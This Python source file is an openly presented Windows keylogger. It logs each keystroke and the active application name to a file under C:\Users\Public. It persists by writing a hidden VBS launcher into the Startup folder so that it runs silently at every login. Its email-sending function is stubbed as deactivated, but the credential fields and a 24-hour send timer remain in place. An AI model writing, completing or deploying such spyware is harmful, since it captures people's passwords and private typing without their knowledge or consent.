import os
import sys
import smtplib
import psutil
import time
import win32gui
import win32process
import ctypes
from pynput import keyboard
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

LOG_FILE = "C:\\Users\\Public\\keylog.txt"  # Change path if needed
EMAIL_ADDRESS = ""  # Replace with your email
EMAIL_PASSWORD = ""  # Use an App Password
SEND_INTERVAL = 86400  # Send logs every 24 hours

current_app = None

# Check if script is already running
def is_already_running():
    script_name = os.path.basename(__file__)
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['name'] == "python.exe":
            try:
                with open(proc.exe(), 'r') as f:
                    if script_name in f.read():
                        return True
            except:
                continue
    return False

# Function to get the active application
def get_active_app():
    global current_app
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['pid'] == pid:
            app_name = proc.info['name']
            if app_name != current_app:  # Log only if the app changes
                current_app = app_name
                with open(LOG_FILE, "a") as log:
                    log.write(f"\n\n[{datetime.now()}] Typing in: {app_name}\n")
            return app_name
    return "Unknown"

# Log keystrokes
def on_press(key):
    get_active_app()
    try:
        with open(LOG_FILE, "a") as log:
            if key == keyboard.Key.space:
                log.write("[SPACE] ")
            elif key == keyboard.Key.backspace:
                log.write("[BACKSPACE] ")
            elif key == keyboard.Key.enter:
                log.write("\n[ENTER] ")
            else:
                log.write(f"{key.char} ")
    except AttributeError:
        pass

# Send logs via email
def send_email():
    pass  # Functionality deactivated

# Run at startup
def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_path = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "keylogger.vbs")

    vbs_code = f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "pythonw {script_path}", 0, False'

    with open(startup_path, "w") as vbs_file:
        vbs_file.write(vbs_code)

# Main script
if __name__ == "__main__":
    if is_already_running():
        sys.exit()  # Exit if another instance is running
    
    add_to_startup()  # Ensure it runs at startup
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        time.sleep(SEND_INTERVAL)
        send_email()
